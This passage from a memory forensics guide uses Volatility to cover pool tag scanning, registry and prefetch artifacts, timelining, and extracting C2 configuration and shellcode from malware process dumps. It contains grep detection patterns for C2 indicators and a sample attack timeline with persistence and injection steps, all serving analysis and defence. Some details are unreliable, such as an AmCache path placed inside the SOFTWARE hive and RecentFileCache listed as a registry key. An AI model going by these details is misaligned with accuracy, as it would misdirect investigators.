| Hidden PID in handle table | `windows.handles` enumerates handle table directly |

---

## 9. Pool Tag Scanning

### 9.1 Windows Pool Tags

The Windows kernel allocator tags every pool allocation with a 4-byte identifier. Pool tag scanning finds kernel objects by their tag rather than by walking lists — the same philosophy as `psscan` [27](https://www.forensicnotes.com/pool-tag-scanning-in-volatility/).

Common pool tags:

| Tag | Structure | Object |
|-----|-----------|--------|
| `Proc` | `_EPROCESS` | Process object |
| `Thre` | `_ETHREAD` | Thread object |
| `Vadb` | `_MMVAD` | VAD node (memory region) |
| `File` | `_FILE_OBJECT` | Open file |
| `Even` | `_KEVENT` | Event object |
| `Mut` | `_KMUTANT` | Mutex object |
| `Key ` | `_CM_KEY_BODY` | Registry key object |
| `CMcb` | `_CM_KEY_CONTROL_BLOCK` | Registry key control block |
| `MmSt` | `_MI_PARTITION` | Memory partition (session) |
| `IoTo` | `_IO_TIMER` | I/O timer (kernel timer) |

### 9.2 Pool Scanner Plugin

**`windows.poolscanner`** — scans the entire dump for all objects matching specified pool tags:

```bash
# Find every _EPROCESS by scanning for pool tag "Proc"
vol -f mem.raw windows.poolscanner --tag Proc
```

```text
Offset     Tag   Index   Data           Type
0x8c0492c0 Proc  0x00    ...            _EPROCESS (PID 4, System)
0x8b2c3340 Proc  0x00    ...            _EPROCESS (PID 440, smss.exe)
...
```

The pool scanner finds kernel objects regardless of whether they appear in any linked list — it is the ultimate DKOM-busting tool. It also finds freed/old objects that still exist in memory (zero-day evidence: a process that ran and exited may still have its EPROCESS sitting in freed pool).

### 9.3 Rootkit Detection via Pool Tags

Custom rootkits sometimes allocate their own pool with unique tags. Scanning for unusual or unknown tags flags these:

```bash
vol -f mem.raw windows.poolscanner --tags All
# Look for tags not in the standard list
```

A driver that allocates pool with tag `EviL` or `HacK` is either a tester, a defender who should know better, or a rootkit.

---

## 10. Registry and Prefetch Analysis

### 10.1 Registry Hives in Memory

The Windows registry is a transactional database of hives: `SYSTEM`, `SOFTWARE`, `SAM`, `SECURITY`, `NTUSER.DAT`, `USRCLASS.DAT`. Volatility reads them from memory without touching disk [28](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.windows.registry.html).

Key forensic artifacts in registry hives:

| Artifact | Hive | Key Path |
|----------|------|----------|
| ShimCache (AppCompatCache) | SYSTEM | `ControlSet001\Control\Session Manager\AppCompatCache` |
| AmCache | SOFTWARE | `Microsoft\Windows NT\CurrentVersion\AppCompatCache\Amcache.hve` |
| UserAssist | NTUSER.DAT | `Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count` |
| RecentFileCache | SOFTWARE | `Microsoft\Windows NT\CurrentVersion\AppCompatFlags\RecentFileCache` |
| MUICache | NTUSER.DAT | `Software\Microsoft\Windows\ShellNoRoam\MUICache` |
| Shellbags | USRCLASS.DAT | `Local Settings\Software\Microsoft\Windows\Shell\BagMRU` |

### 10.2 ShimCache (AppCompatCache)

ShimCache records every executed executable's path, last modified time, and file size. It is a low-level artifact: even if the binary is deleted, its ShimCache entry survives [29](https://www.mandiant.com/resources/blog/shimcache-to-hunt-attacks):

```bash
vol -f mem.raw windows.registry.printkey --key "ControlSet001\Control\Session Manager\AppCompatCache"
```

The output is compact binary data. Use Volatility's `windows.shimcache` plugin (Vol 2) or a third-party parser to decode it. The ShimCache contains the last modified timestamp of the executable (not the execution time) and the path. It survives process termination and reboot.

### 10.3 Prefetch

Prefetch files (`.pf`) record the first few seconds of a program's execution: loaded DLLs, file paths, and run count. They are stored on disk at `C:\Windows\Prefetch\` but also referenced in memory:

```bash
vol -f mem.raw windows.filescan | grep -i prefetch
# Then dump the .pf file
vol -f mem.raw windows.dumpfiles --virtaddr <offset>
```

Parse `.pf` files offline with tools like `PECmd` (Eric Zimmerman) to extract run count, last run time, and the list of files touched during execution.

### 10.4 AmCache

AmCache (`Amcache.hve`) records program execution, installation, and driver loading. It is more detailed than ShimCache (includes SHA-1 hashes, product names, publishers):

```bash
vol -f mem.raw windows.registry.printkey --key "Microsoft\Windows NT\CurrentVersion\AppCompatCache\Amcache.hve\InventoryApplication"
```

### 10.5 UserAssist

UserAssist records GUI program launches via Explorer. The values are ROT-13 encoded in the registry:

```bash
vol -f mem.raw windows.registry.printkey --key "Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
```

Decode the ROT-13 value names to reveal paths like `C:\Users\user\AppData\Roaming\malware.exe`.

### 10.6 Shellbags

Shellbags record Explorer folder view settings and are the definitive artifact for proving a user browsed a specific folder:

```bash
# Volatility 2: shellbags plugin
# Volatility 3: dump the USRCLASS.DAT hive and parse offline
vol -f mem.raw windows.registry --hive-filter USRCLASS.DAT
vol -f mem.raw windows.dumpfiles --virtaddr <offset_of_USRCLASS.DAT>
```

Parse the dumped hive with `ShellBags Explorer` or similar.

---

## 11. Timelining

### 11.1 The Compound Timeline

Timelining merges artifacts from multiple sources into a unified event sequence. The power is in correlation: a network connection at 08:00:12 makes no sense until you see the registry Run key written at 08:00:10 and the process created at 08:00:00.

Artifact sources for a full timeline [19](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.windows.timeliner.html):

| Source | Volatility Plugin | Timestamps |
|--------|-------------------|------------|
| Process creation | `windows.pstree` | CreateTime, ExitTime |
| Process termination | `windows.psscan` | ExitTime (even after unlink) |
| File access | `windows.filescan` | CreateTime, LastAccessTime (in `_FILE_OBJECT`) |
| Registry modification | `windows.registry.printkey` | LastWriteTime per key |
| Network connections | `windows.netscan` | CreateTime for TCP endpoints |
| Event logs | `windows.eventlogs` | Each event's timestamp |
| UserAssist | `windows.registry` | Last execution time |
| Prefetch | file scan + .pf parse | Last run time, run count |

### 11.2 Using `windows.timeliner`

```bash
# Full timeline, CSV format for external analysis
vol -f mem.raw windows.timeliner --output=csv --output-file timeline.csv

# Filter by time window
vol -f mem.raw windows.timeliner --min-ts 2025-06-01 --max-ts 2025-06-02
```

The output format per row:

```text
Timestamp               Description
2025-06-01 08:00:00     Process creation: C:\Users\user\AppData\Local\Temp\installer.exe (PID 1234)
2025-06-01 08:00:05     Registry key modification: \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate (value: "C:\Users\user\AppData\Local\Temp\installer.exe" -silent)
2025-06-01 08:00:08     File creation: \Users\user\AppData\Local\Temp\payload.dll
2025-06-01 08:00:10     Process injection detected: PID 1234, address 0x3b00000, RWX, tag=VadS
2025-06-01 08:00:12     Network connection: 192.168.1.5:49152 -> 203.0.113.5:443 (TLS handshake)
```

### 11.3 Combining with Disk Forensics

For the most complete picture, merge the memory timeline with disk-based artifacts:

- **MFT** (Master File Table) — file creation/modification/access timestamps for every file
- **USN journal** — change journal records for NTFS volume activity
- **Event Logs** — `.evtx` files for security, system, application, and PowerShell events
- **Prefetch** — execution timing
- **Browser history** — web activity

A compound timeline across memory + disk is the gold standard for incident reconstruction.

---

## 12. Malware Config Extraction

### 12.1 C2 Config in Memory

Memory dumps capture the unpacked, runtime state of malware, including plaintext C2 configuration that is encrypted on disk. The workflow:

1. **Identify the malicious process** via process listing, network connections, or malfind.
2. **Dump the process memory**: `windows.memdump --pid <pid>`.
3. **Search for C2 indicators** in the dump: IP addresses, domains, port numbers, URLs, and encryption keys.

```bash
# Dump process memory
vol -f mem.raw windows.memdump --pid 1234 --dump

# Search for domains (example)
strings pid.1234.dmp | grep -E 'http[s]?://|\.(com|net|org|ru|cn)\b' | sort -u
```

### 12.2 Finding C2 Domains and IPs

Known patterns for C2 extraction:

| Pattern | What to grep for |
|---------|-----------------|
| HTTP beacon URL | `http://` or `https://` |
| Plain C2 IP | `([0-9]{1,3}\.){3}[0-9]{1,3}` |
| Port number | Port > 1024 near IP patterns |
| Base64 configs | Match base64 in data sections |
| JA3/JA3S hashes | Check TLS handshake data in network plugins |

### 12.3 Decryption Key Extraction

Malware decrypts its config at runtime. The decryption key is present in memory in plaintext during execution:

```bash
# Search for AES keys (128/256 bit)
vol -f mem.raw windows.memdump --pid 1234 --dump
strings pid.1234.dmp | grep -E '[A-Za-z0-9+/]{16,}={0,2}'  # base64 keys
# Dump VAD region near the decryption routine
vol -f mem.raw windows.vadinfo --pid 1234 --base 0x30000
```

### 12.4 Finding Decryption Routines in Memory

The decryption routine is code that reads ciphertext, processes it with XOR/RC4/AES/TEA, and writes plaintext. Find it by:

1. **Network trigger**: dump memory around the `send`/`recv` call sites.
2. **Crypto API hooking**: `windows.callbacks` for any crypto-related hook.
3. **VAD proximity**: dump memory near RWX regions for samples that self-decrypt.
4. **TTD reconstruction**: if you have a TTD trace, query every call to `CryptDecrypt`, `VirtualProtect`, or custom decryption functions.

```bash
# Find all executable pages near a known address from dlllist
vol -f mem.raw windows.vadtree --pid 1234 | grep RWX

# Dump a candidate decryption routine region
vol -f mem.raw windows.memdump --pid 1234 --base 0x3b00000 --size 0x1000 --dump
```

### 12.5 Automated Config Extraction

For known malware families, Volatility can be combined with `capemon` or config extractors:

```bash
# Volatility 3: run YARA rules against the memory dump
vol -f mem.raw windows.vadyarascan --pid 1234 --yara-rules family-config.yara
```

The `vadyarascan` plugin scans VAD regions against YARA rules, making it possible to detect and extract known config patterns (embedded C2, mutex names, registry keys) in a single pass.

### 12.6 Shellcode Analysis from Memory

When shellcode is found via `malfind` or `psscan`, extract and disassemble:

```bash
# Dump the shellcode region
vol -f mem.raw windows.memdump --pid 1234 --base 0x3b00000 --size 0x2000 --dump

# Disassemble with r2/rizin
rizin -q -c 'aaa; s 0x3b00000; V' shellcode.bin

# Or with ndisasm
ndisasm -b 64 -o 0 shellcode.bin
```

Shellcode extracted from memory is already decoded (unlike on-disk samples). It reveals the payload's actual network endpoints, staging commands, and encryption material.

---

## Sources

- Volatility Foundation, *Volatility 3 Documentation* [1](https://volatility3.readthedocs.io/en/latest/)
- Exterro, *FTK Imager User Guide* [2](https://www.exterro.com/ftk-imager)
- Magnet Forensics, *Magnet DumpIt* [3](https://www.magnetforensics.com/resources/magnet-dumpit/)
- Velocidex, *WinPmem: Memory Acquisition Driver* [4](https://github.com/Velocidex/WinPmem)
- Belkasoft, *RAM Capturer* [5](https://belkasoft.com/ram-capturer)
- 504ensicsLabs, *LiME — Linux Memory Extractor* [6](https://github.com/504ensicsLabs/LiME)
- Microsoft, *AVML — Acquire Volatile Memory for Linux* [7](https://github.com/microsoft/avml)
- Google Rekall, *OSXPMem* [8](https://github.com/google/rekall/blob/master/tools/osxpmem/README.md)
- VMware, *vmss2core fling* [9](https://labs.vmware.com/flings/vmss2core)
- Volatility Foundation, *Windows Hibernation Plugin* [10](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.html)
- Case, A. et al., *Memory Forensics: The Quest for Atomic Acquisition*, Forensic Science International: Digital Investigation [11](https://www.sciencedirect.com/science/article/pii/S2666281721000286)
- Volatility Foundation, *Framework Interfaces* [12](https://volatility3.readthedocs.io/en/latest/volatility3.framework.interfaces.html)
- Volatility Foundation, *Symbol Tables* [13](https://volatility3.readthedocs.io/en/latest/symbol-tables.html)
- Volatility Foundation, *Volatility 3 GitHub Repository* [14](https://github.com/volatilityfoundation/volatility3)
- Elastic, *Hunting Memory for Malware* [15](https://www.elastic.co/blog/hunting-memory)
- Volatility Foundation, *psscan plugin* [16](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.windows.psscan.html)
- Volatility Foundation, *netscan plugin* [17](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.windows.netscan.html)
- Volatility Foundation, *malfind plugin* [18](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.windows.malfind.html)
- Volatility Foundation, *timeliner plugin* [19](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.windows.timeliner.html)
- Volatility Foundation, *check_afinfo plugin* [20](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.linux.check_afinfo.html)
- CrowdStrike, *Linux Kernel Rootkit Detection* [21](https://www.crowdstrike.com/blog/linux-kernel-rootkits/)
- Objective-See, *macOS Kernel Rootkit Detection* [22](https://objective-see.org/blog/blog_0x7D.html)
- Volatility Foundation, *GitHub Issue #467 — macOS Support* [23](https://github.com/volatilityfoundation/volatility3/issues/467)
- FOR511 (SANS), *Memory Forensics and VAD Analysis* [24](https://www.for511.com/memory-forensics/)
- sysopfb, *hollowfind — Process Hollowing Detection Plugin* [25](https://github.com/sysopfb/hollowfind)
- CrowdStrike, *Windows Kernel Rootkits* [26](https://www.crowdstrike.com/blog/windows-kernel-rootkits/)
- ForensicNotes, *Pool Tag Scanning in Volatility* [27](https://www.forensicnotes.com/pool-tag-scanning-in-volatility/)
- Volatility Foundation, *Registry Plugin* [28](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.windows.registry.html)
- Mandiant, *ShimCache: Hunting Malware with Application Compatibility Cache* [29](https://www.mandiant.com/resources/blog/shimcache-to-hunt-attacks)
- Ligh, M. H. et al., *The Art of Memory Forensics*, Wiley (2014) [30](https://www.wiley.com/en-us/The+Art+of+Memory+Forensics%3A+Detecting+Malware+and+Threats+in+Windows%2C+Linux%2C+and+Mac+Memory-p-9781118825099)
- Volatility Foundation, *VADYaraScan Plugin* [31](https://github.com/volatilityfoundation/volatility3)
- Hargreaves, C. & Chivers, H., *Recovery of Encryption Keys from Memory*, DFRWS (2008) [32](https://dfrws.org/2008/proceedings/70-hargreaves.pdf)
